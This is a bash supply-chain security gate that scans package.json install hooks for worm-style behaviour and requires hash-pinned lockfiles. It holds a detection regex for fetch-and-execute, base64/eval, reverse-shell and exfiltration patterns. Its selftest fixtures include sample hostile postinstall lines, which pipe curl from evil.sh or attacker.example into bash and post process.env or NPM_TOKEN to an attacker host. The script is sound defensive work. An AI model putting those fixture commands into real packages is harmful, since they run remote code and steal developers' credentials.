#!/usr/bin/env bash
# WALTEUR supply-chain-gate - HARD gate (ULTIMATE R3). The fastest-growing 2026 attack is malicious-package
# supply-chain (Shai-Hulud / self-replicating worms that run during `install` and steal cloud/npm/GitHub
# tokens). CVE scanners (OSV/Trivy/Snyk) are STRUCTURALLY BLIND to it until after disclosure. WALTEUR installs
# the dependencies it chose during its own build, so it is directly exposed. This gate runs BEHAVIORAL analysis
# on package lifecycle scripts (fetch-and-execute, base64+eval, inline code-exec, token exfil) and requires a
# committed, NON-VACUOUS lockfile for reproducible, hash-pinned installs.
#
# Applies when a dependency manifest is present (package.json / requirements.txt / pyproject / Gemfile / ...).
# CONTRACT: malicious lifecycle script => FAIL exit 2 . missing/vacuous lockfile at high/regulated => FAIL .
# no deps => NOT_APPLICABLE . jq absent => SKIP . PAUSED => exit 2 . bypass WALTEUR_SUPPLYCHAIN=off.
# Report: walteur-kit/supply-chain-report.json
# --help: self-documentation BEFORE any side effect (S033 usability contract)
case "${1:-}" in
  -h|--help)
  printf '%s\n' "supply-chain-gate - HARD gate (ULTIMATE R3). The fastest-growing 2026 attack is malicious-package"
  printf '%s\n' "usage: bash supply-chain-gate.sh [--selftest|--help|<default run>]"
  printf '%s\n' "report: walteur-kit/supply-chain-report.json - fix recipes: walteur-kit/REMEDIATION.md (## supply-chain-gate)"
  printf '%s\n' "bypass: WALTEUR_SUPPLYCHAIN=off (recorded, not free)"
  exit 0 ;;
esac

set -uo pipefail

ROOT="${WALTEUR_ROOT:-$(git rev-parse --show-toplevel 2>/dev/null || pwd)}"
KIT="$ROOT/walteur-kit"
CONTRACT="$KIT/build-contract.json"
REPORT="$KIT/supply-chain-report.json"
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
mkdir -p "$KIT"
have() { command -v "$1" >/dev/null 2>&1; }

findings='[]'; failures=0
add_finding() { findings="$(printf '%s' "$findings" | { have jq && jq --arg c "$1" --arg m "$2" '. + [{check:$c, message:$m}]' || cat; } 2>/dev/null || printf '%s' "$findings")"; failures=$((failures+1)); }
write_report() { v="$1"; r="$2"; if have jq; then jq -n --arg v "$v" --arg ts "$TS" --arg r "$r" --argjson f "$findings" '{verdict:$v, ts:$ts, gate:"supply-chain", reason:$r, findings:$f}' > "$REPORT" 2>/dev/null && return 0; fi; printf '{"verdict":"%s","ts":"%s","gate":"supply-chain","reason":"%s"}\n' "$v" "$TS" "$r" > "$REPORT" 2>/dev/null || true; }
risk() { [ -f "$CONTRACT" ] && have jq && jq -r '.risk_tier // "medium"' "$CONTRACT" 2>/dev/null || echo medium; }

# UNIFIED prune list - used identically by the applicability probe, the behavioral scanner, AND the
# lockfile scan. Only ever prune installed-dep/VCS dirs. NEVER prune build/dist/vendor: a package.json
# under build/ can be a real, declared npm workspace member whose postinstall npm executes - pruning it
# (while still seeing it for applicability) was a structural false-negative. Fail-closed: scan everything
# the applicability probe can see.
PRUNE=( -name node_modules -o -name .git )
pkgjsons() { find "$ROOT" \( "${PRUNE[@]}" \) -prune -o -type f -name package.json -print 2>/dev/null; }
lockfiles() { find "$ROOT" \( "${PRUNE[@]}" \) -prune -o -type f \( -name package-lock.json -o -name pnpm-lock.yaml -o -name yarn.lock -o -name npm-shrinkwrap.json \) -print 2>/dev/null; }
any_manifest() {
  command -v find >/dev/null 2>&1 || return 1
  find "$ROOT" \( "${PRUNE[@]}" \) -prune -o -type f \
    \( -name package.json -o -name requirements.txt -o -name pyproject.toml -o -name Pipfile -o -name go.mod \
    -o -name Cargo.toml -o -name Gemfile -o -name composer.json -o -name pom.xml \) -print -quit 2>/dev/null | grep -q .
}
# malicious lifecycle-script signatures (the Shai-Hulud fetch-and-execute / token-exfil class)
MAL='(curl|wget|Invoke-WebRequest|iwr)\b[^|&;]*(\||\$\(|`)|(curl|wget)[^|]*\|[[:space:]]*(sh|bash|node|python)|base64[[:space:]]+(-d|--decode)|atob\(|\beval[[:space:]]*\(|node[[:space:]]+-e[[:space:]]|python3?[[:space:]]+-c[[:space:]]|child_process|require\([[:space:]]*[^)]*child_process|process\.env[^;]*(http|fetch|net\.|socket)|/dev/tcp/|nc[[:space:]]+-e'

# Scan one raw (possibly multi-line) lifecycle-script body for the MAL signatures. Returns 0 == MATCH.
# perl -0777 slurps the WHOLE body so the regex sees every byte across embedded newlines; grep -P is
# locale-broken on Git Bash so it is not used here. Body arrives on stdin so newlines survive intact.
# MAL is passed via the environment and compiled with qr/.../ so the literal '/' bytes in the pattern
# (e.g. /dev/tcp/) are NOT taken as m// delimiters and POSIX classes stay intact.
# Fail-closed fallback: if perl is unavailable, scan with grep -E. The MAL signatures are all single-line
# patterns, and grep scans every line of the raw multi-line body, so a malicious continuation line is
# still caught even though grep cannot match across a newline. The scan is therefore never silently
# skipped (no fail-open) when perl is missing.
body_is_malicious() {
  local rc
  if have perl; then
    MAL="$MAL" perl -0777 -ne 'BEGIN{$re=qr/$ENV{MAL}/} exit(/$re/ ? 2 : 0)' 2>/dev/null; rc=$?
    [ "$rc" -eq 2 ]
  else
    grep -Eq "$MAL"
  fi
}

# A lockfile is NON-VACUOUS only if it actually pins something with hash-verification:
#   npm v2+/v3 package-lock.json / npm-shrinkwrap.json : lockfileVersion>=2 AND >=1 "integrity" sha hash
#   yarn.lock        : at least one "integrity sha512-..." / "resolved ..." entry
#   pnpm-lock.yaml   : a non-empty packages: map with at least one integrity/resolution
# An empty {} / packages:{} / 0-integrity stub is functionally NO lockfile (npm ci cannot reproduce or
# hash-verify), so it must NOT satisfy the committed-lockfile requirement. Returns 0 == substantive.
lockfile_substantive() {
  local f="$1" base; base="$(basename "$f")"
  case "$base" in
    package-lock.json|npm-shrinkwrap.json)
      # Must be a single valid JSON object, lockfileVersion>=2, and carry >=1 integrity hash.
      jq -e -n --slurpfile d "$f" '
        ($d|length==1) and ($d[0]|type=="object")
        and (($d[0].lockfileVersion // 0) | (try tonumber catch 0) >= 2)
        and ([ $d[0] | .. | objects | .integrity? // empty | select(type=="string" and (test("^sha(512|384|256|1)-")))] | length >= 1)
      ' >/dev/null 2>&1
      ;;
    yarn.lock)
      grep -Eq '^[[:space:]]*(integrity[[:space:]]+sha|resolved[[:space:]]+")' "$f" 2>/dev/null
      ;;
    pnpm-lock.yaml)
      # require a non-empty packages: section AND at least one integrity/resolution hash
      grep -Eq '^[[:space:]]*packages:' "$f" 2>/dev/null && grep -Eq '(integrity:|resolution:)' "$f" 2>/dev/null
      ;;
    *) return 1 ;;
  esac
}

# Returns 0 if at least one committed lockfile exists AND is substantive (non-vacuous).
have_substantive_lockfile() {
  local lf found=1
  while IFS= read -r lf; do
    [ -n "$lf" ] || continue
    if lockfile_substantive "$lf"; then found=0; fi
  done < <(lockfiles)
  return $found
}

selftest() {
  pass=0; fail=0
  # $0 may be relative; make it ABSOLUTE before any cd happens inside helpers.
  local SELF; SELF="$0"; case "$SELF" in /*|?:[\/]*) ;; *) SELF="$(pwd)/$SELF";; esac
  ck() { if [ "$2" = "$3" ]; then echo "  ok   - $1 (rc=$3)"; pass=$((pass+1)); else echo "  FAIL - $1 (want $2 got $3)"; fail=$((fail+1)); fi; }
  if ! have jq; then echo "supply-chain selftest SKIP - jq not installed."; return 0; fi
  echo "supply-chain-gate selftest:"
  run() { WALTEUR_ROOT="$1" bash "$SELF" >/dev/null 2>&1; echo $?; }
  # base = high risk + a SUBSTANTIVE lockfile (so the only finding is whatever the case under test adds)
  goodlock() { printf '%s\n' '{"name":"a","lockfileVersion":3,"packages":{"node_modules/x":{"version":"1.0.0","integrity":"sha512-AAAA"}}}' > "$1/package-lock.json"; }
  base() { mkdir -p "$1/walteur-kit"; printf '{"risk_tier":"%s"}\n' "${2:-high}" > "$1/walteur-kit/build-contract.json"; goodlock "$1"; }
  pj() { printf '%s\n' "$2" > "$1/package.json"; }

  # 1. no manifest -> NA
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; mkdir -p "$t/walteur-kit"; printf '{"risk_tier":"high"}\n' > "$t/walteur-kit/build-contract.json"; ck "no manifest -> NA" 0 "$(run "$t")"; rm -rf "$t"
  # 2. clean scripts + substantive lockfile -> PASS
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"build":"tsc","test":"vitest"}}'; ck "clean scripts -> PASS" 0 "$(run "$t")"; rm -rf "$t"
  # 3. postinstall fetch-and-execute -> FAIL
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"postinstall":"curl -s http://evil.sh | bash"}}'; ck "fetch-execute postinstall -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # 4. base64 decode + pipe sh -> FAIL
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"install":"echo aGk= | base64 -d | sh"}}'; ck "base64 decode install -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # 5. eval( in preinstall -> FAIL
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"preinstall":"node -e \"eval(process.env.X)\""}}'; ck "node -e eval preinstall -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # 6. token exfil (process.env -> http) in prepare -> FAIL
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"prepare":"node -e \"fetch(\\\"http://x\\\",{body:process.env.NPM_TOKEN})\""}}'; ck "token exfil prepare -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # 7. package.json at high risk with NO lockfile -> FAIL (no reproducible/hash-pinned install)
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; mkdir -p "$t/walteur-kit"; printf '{"risk_tier":"high"}\n' > "$t/walteur-kit/build-contract.json"; pj "$t" '{"name":"a","scripts":{"build":"tsc"}}'; ck "no lockfile (high) -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # 8. same but low risk -> PASS (lockfile advisory below high)
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; mkdir -p "$t/walteur-kit"; printf '{"risk_tier":"low"}\n' > "$t/walteur-kit/build-contract.json"; pj "$t" '{"name":"a","scripts":{"build":"tsc"}}'; ck "no lockfile (low) -> PASS" 0 "$(run "$t")"; rm -rf "$t"
  # 9. bypass + PAUSED
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"a","scripts":{"postinstall":"curl x | sh"}}'; WALTEUR_ROOT="$t" WALTEUR_SUPPLYCHAIN=off bash "$SELF" >/dev/null 2>&1; ck "bypass -> exit 0" 0 "$?"; rm -rf "$t"
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; touch "$t/walteur-kit/PAUSED"; ck "PAUSED -> exit 2" 2 "$(run "$t")"; rm -rf "$t"

  # --- REGRESSION cases for the 3 proven red-team false-negatives ---
  # G1. \n-encoded multi-line postinstall: benign first line, malicious fetch-and-execute continuation.
  #     The decoded newline must NOT shadow the payload. -> FAIL.
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"victim","scripts":{"postinstall":"echo installing deps\ncurl -s http://attacker.example/x.sh | bash"}}'; ck "G1 newline-encoded payload -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # G1b. false-positive guard: a benign MULTI-LINE postinstall (no MAL bytes) still PASSES.
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; pj "$t" '{"name":"ok","scripts":{"postinstall":"echo line one\necho line two\nmkdir -p dist"}}'; ck "G1b benign multi-line postinstall -> PASS" 0 "$(run "$t")"; rm -rf "$t"
  # G2. workspace member under build/ with token-exfil postinstall (prune-list inconsistency). -> FAIL.
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; mkdir -p "$t/build/native-deps"; pj "$t" '{"name":"app","private":true,"workspaces":["build/native-deps"],"scripts":{"build":"tsc"}}'; printf '%s\n' '{"name":"native-deps","version":"1.0.0","scripts":{"postinstall":"node -e \"fetch(\\\"https://exfil.attacker.tld/c\\\",{method:\\\"POST\\\",body:JSON.stringify(process.env)})\""}}' > "$t/build/native-deps/package.json"; ck "G2 build/ workspace exfil -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # G2b. false-positive guard: a CLEAN package.json under build/ still PASSES (we widened the scan, not the verdict).
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; base "$t"; mkdir -p "$t/build/native-deps"; pj "$t" '{"name":"app","private":true,"workspaces":["build/native-deps"],"scripts":{"build":"tsc"}}'; printf '%s\n' '{"name":"native-deps","version":"1.0.0","scripts":{"postinstall":"node ./gyp-build.js"}}' > "$t/build/native-deps/package.json"; ck "G2b build/ clean workspace -> PASS" 0 "$(run "$t")"; rm -rf "$t"
  # G3. VACUOUS lockfile (valid JSON, packages:{}, 0 integrity) at high risk -> FAIL (functionally no lockfile).
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; mkdir -p "$t/walteur-kit"; printf '{"risk_tier":"high"}\n' > "$t/walteur-kit/build-contract.json"; pj "$t" '{"name":"billing","dependencies":{"left-pad":"*"}}'; printf '%s\n' '{"name":"billing","lockfileVersion":3,"requires":true,"packages":{}}' > "$t/package-lock.json"; ck "G3 vacuous lockfile (high) -> FAIL" 2 "$(run "$t")"; rm -rf "$t"
  # G3b. false-positive guard: a SUBSTANTIVE lockfile (lockfileVersion>=2 + integrity) at high risk -> PASS.
  t="$(mktemp -d "${TMPDIR:-/tmp}/supplychai.XXXXXX")"; mkdir -p "$t/walteur-kit"; printf '{"risk_tier":"high"}\n' > "$t/walteur-kit/build-contract.json"; pj "$t" '{"name":"billing","dependencies":{"left-pad":"^1.3.0"}}'; printf '%s\n' '{"name":"billing","lockfileVersion":3,"packages":{"node_modules/left-pad":{"version":"1.3.0","integrity":"sha512-XYZ"}}}' > "$t/package-lock.json"; ck "G3b substantive lockfile (high) -> PASS" 0 "$(run "$t")"; rm -rf "$t"

  echo "supply-chain-gate selftest: $pass/$((pass+fail)) passed"
  [ "$fail" -eq 0 ]
}

if [ "${1:-}" = "--selftest" ]; then selftest; exit $?; fi

[ -f "$KIT/PAUSED" ] && { echo "WALTEUR PAUSED (walteur-kit/PAUSED)." >&2; exit 2; }
[ "${WALTEUR_SUPPLYCHAIN:-on}" = "off" ] && { write_report "SKIP" "bypassed via WALTEUR_SUPPLYCHAIN=off"; echo "supply-chain-gate: bypassed." >&2; exit 0; }

if ! any_manifest; then write_report "NOT_APPLICABLE" "no dependency manifest"; echo "supply-chain-gate: NOT_APPLICABLE"; exit 0; fi
if ! have jq; then write_report "SKIP" "jq unavailable"; echo "supply-chain-gate: SKIP." >&2; exit 0; fi
RISK="$(risk)"

# (1) behavioral scan of EVERY package.json's install-lifecycle scripts (recursively, same prune list as
# the applicability probe so a workspace member under build/ etc. cannot be seen-but-not-scanned).
# A lifecycle script VALUE can itself be multi-line: npm passes the ENTIRE string to `sh -c`, so an
# embedded newline is just a SECOND command that runs at install time. The old code emitted "key\tvalue"
# via jq -r and re-split on newlines with `read`, so jq's decoded \n turned one malicious value into
# several iterations and a benign first line shadowed the malicious continuation (the \n-encoding evasion).
# We instead enumerate the lifecycle hook KEYS (safe: keys match the anchored regex and carry no newline),
# then pull each hook's RAW value WHOLE and scan every byte of it at once. Fail-closed.
#
# The key round-trip has TWO fail-open traps, both closed here:
#  (a) A native-Windows jq writes its stdout in TEXT mode, so every record arrives CRLF-terminated
#      ("postinstall\r\n"). `read -r` strips only the \n, so the key became $'postinstall\r'. That key
#      does not exist, `(.scripts[$k] // "")` handed back "", and an EMPTY body scans clean - so every
#      malicious lifecycle script silently PASSED. (`$(...)` hides this: MSYS strips the trailing CRLF
#      there, which is why the risk-tier/lockfile paths were unaffected.) Strip the CR at the read.
#  (b) `// ""` turned "this hook could not be resolved" into "this hook is clean". A scanner that cannot
#      read a body must never report it clean: resolve with has()/error() and treat failure as a FINDING.
# The body is also captured and fed in by here-string rather than piped: under `set -o pipefail` a
# `jq | grep -q` producer/consumer pair lets the consumer exit on first match, SIGPIPEs jq, and the
# non-zero pipeline then discards a REAL match - the same fail-open class this gate exists to catch.
while IFS= read -r pj; do
  [ -n "$pj" ] || continue
  rel="$(printf '%s' "$pj" | sed "s#$ROOT/##")"
  while IFS= read -r hook; do
    hook="${hook%$'\r'}"
    [ -n "$hook" ] || continue
    if ! body="$(jq -r --arg k "$hook" 'if (.scripts|has($k)) then (.scripts[$k]|tostring) else error("unresolvable hook key") end' "$pj" 2>/dev/null)"; then
      add_finding "$rel" "lifecycle script '$hook' could not be read for scanning (unresolvable manifest key) - failing closed rather than assuming it is clean"
      continue
    fi
    if body_is_malicious <<<"$body"; then
      add_finding "$rel" "malicious lifecycle script '$hook' (fetch-and-execute / base64+eval / inline-exec / token-exfil - the Shai-Hulud worm class)"
    fi
  done < <(jq -r '(.scripts // {}) | keys_unsorted[] | select(test("^(pre|post)?(install|prepare|prepublish|prepack)$"))' "$pj" 2>/dev/null)
done < <(pkgjsons)

# (2) reproducible/hash-pinned install - require a committed AND SUBSTANTIVE (non-vacuous) lockfile when a
# JS manifest exists at high/regulated risk. An empty {} / packages:{} / 0-integrity stub is functionally
# NO lockfile: npm ci cannot reproduce or hash-verify the tree and floating ranges still resolve to
# whatever (possibly poisoned) version upstream serves. Existence alone is NOT enough.
if [ -n "$(pkgjsons | head -n1)" ]; then
  if ! have_substantive_lockfile; then
    case "$RISK" in high|regulated) add_finding "lockfile" "package.json present but NO committed, non-vacuous lockfile (need lockfileVersion>=2 with integrity hashes that pin the deps) - installs are not reproducible/hash-pinned; commit a real lockfile and use \`npm ci\` (a moving/empty dep tree is how a poisoned version slips in)";; esac
  fi
fi

if [ "$failures" -ne 0 ]; then
  write_report "FAIL" "$failures supply-chain violation(s)"
  echo "supply-chain-gate: FAIL - $failures violation(s)" >&2
  printf '%s\n' "$findings" | { have jq && jq -r '.[] | "  - " + .check + ": " + .message' || cat; } 2>/dev/null || true
  exit 2
fi
write_report "PASS" "no malicious install scripts; installs are reproducible (substantive lockfile present)"
echo "supply-chain-gate: PASS" >&2
exit 0
